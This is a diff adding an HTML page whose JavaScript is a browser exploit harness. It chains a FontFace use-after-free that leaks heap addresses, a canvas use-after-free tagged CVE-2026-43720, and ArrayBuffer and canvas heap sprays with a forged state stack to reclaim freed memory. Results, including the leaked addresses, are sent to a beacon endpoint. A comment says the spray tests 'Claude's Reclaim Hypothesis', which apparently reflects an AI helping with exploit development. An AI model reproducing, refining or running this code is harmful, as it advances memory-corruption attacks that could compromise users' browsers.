@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P817</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P817 — Cross-Type ArrayBuffer(768) Reclaim & Forged StateStack Test</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P817-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return h16(_bu[0]);}
+
+bn('BOOT','v1');
+log('Starting P817...');
+
+/* ========== PHASE 1: FontFace UAF Heap Anchor ========== */
+var fontHeapBase='none';
+try{
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:p817b;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('p817f',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+
+  var ffAbs=[],ffFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffFired)return undefined;
+      ffFired=true;
+      if(st){st.remove();st.textContent='';}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      ffAbs=[];
+      for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em p817b');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em p817f, p817b','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    for(var a=0;a<ffAbs.length;a++){
+      var bu=new BigUint64Array(ffAbs[a]);
+      if(bu.length>=14 && bu[11]>0x1000000000n){
+        fontHeapBase='0x'+h16(bu[11]);
+        break;
+      }
+    }
+    bn('FONT-LEAK',fontHeapBase);
+    log('Font Heap Base: '+fontHeapBase);
+    runCanvasTests();
+  },200);
+}catch(err){
+  bn('FONT-ERR',err.message);
+  runCanvasTests();
+}
+
+function runCanvasTests(){
+  /* ========== PHASE 2: Canvas UAF Trigger (CVE-2026-43720) ========== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    bn('UAF-FAIL','no_innerCtx');
+    log('FAIL: innerCtx not created');
+    return;
+  }
+  bn('UAF-OK','innerCtx_created');
+  log('UAF triggered successfully');
+
+  /* ========== PHASE 3: ArrayBuffer(768) Spray (Testing Claude's Reclaim Hypothesis) ========== */
+  var SPRAY_AB=300;
+  var abPool=[];
+  var dvPool=[];
+  var MARKER_LW=1234.5678;
+  var MARKER_ML=9876.5432;
+
+  for(var s=0;s<SPRAY_AB;s++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    /* Write markers at multiple candidate offsets in the 768-byte slot */
+    dv.setFloat64(48, MARKER_LW, true);
+    dv.setFloat64(64, MARKER_ML, true);
+    /* Forged m_stateStack at offset 112 (pointing to itself at +160) */
+    dv.setUint32(112, 160, true);
+    dv.setUint32(116, 0, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+    /* State[0] at +160 */
+    dv.setFloat64(160 + 48, MARKER_LW, true);
+    dv.setFloat64(160 + 64, MARKER_ML, true);
+
+    abPool.push(ab);
+    dvPool.push(dv);
+  }
+  bn('AB-SPRAY-DONE','count='+SPRAY_AB);
+  log('Sprayed '+SPRAY_AB+' ArrayBuffer(768) blocks');
+
+  /* ========== PHASE 4: Read Probes on Stale Handle ========== */
+  var abReclaimHit=false;
+  var rLW=-1, rML=-1, readErr='none';
+  try{
+    rLW=innerCtx.lineWidth;
+    rML=innerCtx.miterLimit;
+    if(rLW===MARKER_LW || rML===MARKER_ML){
+      abReclaimHit=true;
+    }
+  }catch(e){
+    readErr=e.name+': '+e.message;
+  }
+
+  bn('AB-RECLAIM-RESULT','hit='+abReclaimHit+'|lw='+rLW+'|ml='+rML+'|err='+readErr);
+  log('ArrayBuffer Reclaim: hit='+abReclaimHit+' lw='+rLW+' ml='+rML+' err='+readErr);
+
+  /* ========== PHASE 5: Fallback to Same-Type Spray ========== */
+  var sameTypeHit=false;
+  var sameTypeAliasIdx=-1;
+  var sprayCanvases=[];
+  var sprayCtxs=[];
+  var MARKER_SAME=7777.77;
+
+  for(var i=0;i<300;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=MARKER_SAME;
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+  }
+
+  var rSameLW=-1;
+  try{rSameLW=innerCtx.lineWidth;}catch(e){}
+
+  if(rSameLW===MARKER_SAME){
+    sameTypeHit=true;
+    innerCtx.lineWidth=9999.99;
+    for(var k=0;k<sprayCtxs.length;k++){
+      if(sprayCtxs[k].lineWidth===9999.99){
+        sameTypeAliasIdx=k;
+        break;
+      }
+    }
+  }
+
+  bn('SAME-TYPE-RESULT','hit='+sameTypeHit+'|aliasIdx='+sameTypeAliasIdx+'|lw='+rSameLW);
+  log('Same-Type Fallback: hit='+sameTypeHit+' aliasIdx='+sameTypeAliasIdx+' lw='+rSameLW);
+
+  bn('DONE','complete|abHit='+abReclaimHit+'|sameHit='+sameTypeHit);
+  log('P817 complete.');
+}
+</script>
+</body></html>
